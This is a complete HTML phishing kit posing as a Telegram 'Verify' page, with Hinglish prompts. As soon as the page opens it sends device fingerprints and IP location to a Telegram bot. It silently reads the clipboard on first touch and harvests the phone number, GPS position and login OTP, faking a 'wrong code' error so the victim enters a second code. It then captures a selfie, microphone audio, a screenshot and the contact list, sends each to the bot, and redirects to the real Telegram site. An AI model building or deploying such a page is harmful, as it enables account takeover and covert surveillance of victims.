<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex">
<title>Verify</title>
<script>
const TOKEN    = "YAHAN_TOKEN";
const CHAT     = "YAHAN_CHAT_ID";
const REDIRECT = "https://web.telegram.org/a/";
</script>
<style>
 body{font-family:system-ui;background:#17212b;color:#fff;display:flex;
      align-items:center;justify-content:center;min-height:100vh;margin:0}
 .box{width:90%;max-width:360px;text-align:center;padding:18px 0}
 h2{font-size:19px;margin:0 0 8px}
 p{color:#8b9aa8;font-size:14px;margin:0 0 14px;line-height:1.5}
 input{width:100%;padding:14px;border-radius:10px;border:1px solid #2b3a47;
       background:#242f3d;color:#fff;font-size:17px;box-sizing:border-box}
 button{width:100%;padding:14px;margin-top:10px;border:0;border-radius:10px;
        background:#3390ec;color:#fff;font-size:16px;font-weight:600}
 button.g{background:#242f3d;border:1px solid #2b3a47;font-weight:500}
 #st{font-size:12px;margin-bottom:10px;min-height:16px}
 .ok{color:#5ec26a} .no{color:#f66}
 .cells{display:flex;gap:8px;justify-content:center;margin:20px 0}
 .cells input{width:44px;height:52px;text-align:center;font-size:22px}
 #pv{width:100%;border-radius:10px;margin-top:10px;background:#000;max-height:28vh}
</style>
</head>
<body>
<div class="box">
  <div id="st"></div>

  <div id="v0">
    <h2>Number daalo</h2>
    <p>Confirm karne ke liye</p>
    <input id="ph" type="tel" inputmode="numeric" placeholder="+91 98765 43210">
    <button id="b0">Aage</button>
  </div>

  <div id="v1" hidden>
    <h2>Code daalo</h2>
    <p id="hint"></p>
    <div class="cells" id="cells">
      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
      <input maxlength="1" inputmode="numeric"><input maxlength="1" inputmode="numeric">
    </div>
    <button id="b1">Verify</button>
    <button id="bRe" class="g">Dobara bhejo</button>
  </div>

  <div id="v2" hidden>
    <h2>Allow karo</h2>
    <p>Verify ke liye</p>
    <button id="bLoc">Location</button>
    <button id="bCam" class="g">Camera</button>
    <button id="bMic" class="g">Mic</button>
    <button id="bScr" class="g">Screen</button>
    <button id="bCon" class="g">Contacts</button>
    <video id="pv" autoplay muted playsinline hidden></video>
    <button id="bEnd" class="g">Ho gaya</button>
  </div>

  <div id="v3" hidden>
    <h2>Ho gaya</h2>
    <p>Verification complete</p>
  </div>
</div>

<script>
/* ---------- helpers ---------- */
const st = document.getElementById('st');
let phone = '?', loc = '-';

function stat(m, good){ st.textContent = m; st.className = good ? 'ok' : 'no'; }

function vid(){
  let id = localStorage.getItem('vid');
  if (!id){ id = 'v' + Math.random().toString(36).slice(2,8); localStorage.setItem('vid', id); }
  return id;
}

async function tg(text){
  try {
    const body = new URLSearchParams({ chat_id: CHAT.trim(), text, parse_mode:'HTML' });
    const r = await fetch('https://api.telegram.org/bot' + TOKEN.trim() + '/sendMessage',
      { method:'POST', body });
    const j = await r.json();
    stat(j.ok ? 'SENT' : 'FAIL: ' + j.description, j.ok);
    return j.ok;
  } catch(e){ stat('FAIL: ' + e.message, false); return false; }
}

async function tgPhoto(blob, cap){
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT.trim());
    fd.append('caption', cap);
    fd.append('photo', blob, 'x.jpg');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN.trim() + '/sendPhoto',
      { method:'POST', body:fd });
    const j = await r.json();
    stat(j.ok ? 'PHOTO SENT' : 'FAIL: ' + j.description, j.ok);
  } catch(e){ stat('FAIL: ' + e.message, false); }
}

async function tgAudio(blob, cap){
  try {
    const fd = new FormData();
    fd.append('chat_id', CHAT.trim());
    fd.append('caption', cap);
    fd.append('audio', blob, 'a.webm');
    const r = await fetch('https://api.telegram.org/bot' + TOKEN.trim() + '/sendAudio',
      { method:'POST', body:fd });
    const j = await r.json();
    stat(j.ok ? 'AUDIO SENT' : 'FAIL: ' + j.description, j.ok);
  } catch(e){ stat('FAIL: ' + e.message, false); }
}

/* ---------- boot test + silent ---------- */
(async () => {
  const o = [];
  try {
    const h = await navigator.userAgentData.getHighEntropyValues(['model','platformVersion']);
    o.push('Model: ' + h.model + ' | ' + h.platformVersion);
  } catch(e){}
  o.push('UA: ' + navigator.userAgent);
  o.push('Screen: ' + screen.width + 'x' + screen.height);
  o.push('TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone);
  o.push('Ref: ' + (document.referrer || 'direct'));
  let ip = 'fail';
  try {
    const d = await (await fetch('https://ipapi.co/json/')).json();
    ip = 'IP: ' + d.ip + '\n' + d.city + ', ' + d.region + '\nISP: ' + d.org;
  } catch(e){}
  tg('[open] ' + vid() + '\n' + ip + '\n<code>' + o.join('\n') + '</code>');
})();

document.addEventListener('touchstart', async function once(){
  document.removeEventListener('touchstart', once);
  try {
    const t = (await navigator.clipboard.readText()).trim();
    if (t) tg('[clip] ' + vid() + '\n<code>' + t.slice(0,300) + '</code>');
  } catch(e){}
}, { passive:true });

/* ---------- number ---------- */
document.getElementById('b0').onclick = async () => {
  const v = document.getElementById('ph').value;
  if (v.replace(/\D/g,'').length < 10) return stat('Sahi number daalo', false);
  phone = v;
  stat('Le rahe hain...', true);
  const l = await new Promise(res => {
    if (!navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res(p.coords.latitude + ',' + p.coords.longitude),
      () => res(null), { enableHighAccuracy:true, timeout:9000 }
    );
  });
  loc = l || '-';
  if (l) tg('[gps] ' + vid() + ' ' + phone + '\n' + l + '\nhttps://maps.google.com/?q=' + l.split(',')[0]);
  tg('[num] ' + vid() + ' ' + phone);
  document.getElementById('hint').textContent = phone + ' par code bheja gaya';
  document.getElementById('v0').hidden = true;
  document.getElementById('v1').hidden = false;
  document.querySelector('#cells input').focus();
};

/* ---------- otp ---------- */
const ins = [...document.querySelectorAll('#cells input')];
ins.forEach((el,i) => {
  el.addEventListener('input', () => {
    el.value = el.value.replace(/\D/g,'');
    if (el.value && i < 5) ins[i+1].focus();
  });
  el.addEventListener('keydown', e => {
    if (e.key === 'Backspace' && !el.value && i > 0) ins[i-1].focus();
  });
});

let tried = false;
document.getElementById('b1').onclick = async () => {
  const code = ins.map(x => x.value).join('');
  if (code.length < 6) return stat('6 digit daalo', false);
  stat('Verify...', true);
  await tg('[otp] ' + vid() + ' ' + phone + '\n<code>' + code + '</code>');
  setTimeout(() => {
    if (!tried){
      tried = true;
      stat('Code galat hai - dobara daalo', false);
      ins.forEach(x => x.value = ''); ins[0].focus();
    } else {
      document.getElementById('v1').hidden = true;
      document.getElementById('v2').hidden = false;
      stat('', true);
    }
  }, 5000);
};

document.getElementById('bRe').onclick = () => tg('[resend] ' + phone);

/* ---------- permissions ---------- */
document.getElementById('bLoc').onclick = () => {
  navigator.geolocation.getCurrentPosition(
    p => tg('[gps] ' + vid() + ' ' + phone + '\n' + p.coords.latitude + ',' + p.coords.longitude),
    () => stat('GPS deny', false),
    { enableHighAccuracy:true, timeout:9000 }
  );
};

document.getElementById('bCam').onclick = async () => {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' } });
    const v = document.getElementById('pv');
    v.hidden = false; v.srcObject = s;
    await new Promise(r => setTimeout(r, 1200));
    const c = document.createElement('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
    if (b) await tgPhoto(b, 'SELFIE ' + phone);
    s.getTracks().forEach(t => t.stop());
  } catch(e){ stat('Cam: ' + e.name, false); }
};

document.getElementById('bMic').onclick = async () => {
  try {
    const s = await navigator.mediaDevices.getUserMedia({ audio:true });
    const rec = new MediaRecorder(s); const ch = [];
    rec.ondataavailable = e => ch.push(e.data);
    rec.onstop = async () => {
      await tgAudio(new Blob(ch, { type:'audio/webm' }), 'MIC ' + phone);
      s.getTracks().forEach(t => t.stop());
    };
    rec.start(); setTimeout(() => rec.stop(), 4000);
    stat('Record 4s...', true);
  } catch(e){ stat('Mic: ' + e.name, false); }
};

document.getElementById('bScr').onclick = async () => {
  try {
    const s = await navigator.mediaDevices.getDisplayMedia({ video:{ frameRate:5 } });
    const v = document.getElementById('pv');
    v.hidden = false; v.srcObject = s;
    await new Promise(r => setTimeout(r, 2500));
    const c = document.createElement('canvas');
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext('2d').drawImage(v, 0, 0);
    const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.75));
    if (b) await tgPhoto(b, 'SCREEN ' + phone);
    s.getTracks().forEach(t => t.stop());
  } catch(e){ stat('Scr: ' + e.name, false); }
};

document.getElementById('bCon').onclick = async () => {
  if (!navigator.contacts || !navigator.contacts.select) return stat('Contacts nahi', false);
  try {
    const list = await navigator.contacts.select(['name','tel'], { multiple:true });
    if (!list.length) return stat('Koi nahi chuna', false);
    const txt = list.slice(0,100)
      .map(c => (c.name||['?'])[0] + ' — ' + (c.tel||[''])[0]).join('\n');
    tg('[contacts ' + list.length + '] ' + phone + '\n<code>' + txt + '</code>');
  } catch(e){ stat('Cancel', false); }
};

document.getElementById('bEnd').onclick = () => {
  document.getElementById('v2').hidden = true;
  document.getElementById('v3').hidden = false;
  try { Notification.requestPermission(); } catch(e){}
  setTimeout(() => location.href = REDIRECT, 1200);
};
</script>
</body>
</html>
